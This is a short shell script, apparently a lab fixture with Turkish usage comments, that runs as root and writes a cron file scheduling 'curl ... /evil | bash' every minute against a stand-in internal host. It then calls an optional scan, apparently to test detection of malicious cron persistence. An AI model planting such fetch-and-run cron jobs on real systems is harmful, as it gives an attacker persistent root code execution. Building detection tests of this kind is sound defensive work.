#!/bin/sh
# CRON_HIGH_RISK
# Doğrudan: sudo sh ./cron.sh
# Tarama:    GCLAB_RUN_SCAN=1 sudo sh ./cron.sh   veya   sudo sh ./cron.sh scan
. "$(cd "$(dirname "$0")" && pwd)/lib-env.sh"
set -e
printf '%s\n' '* * * * * root curl -s http://10.0.0.1/evil | bash -c' > /etc/cron.d/lab-attack
chmod 644 /etc/cron.d/lab-attack

gclab_scan_if_requested "$@"
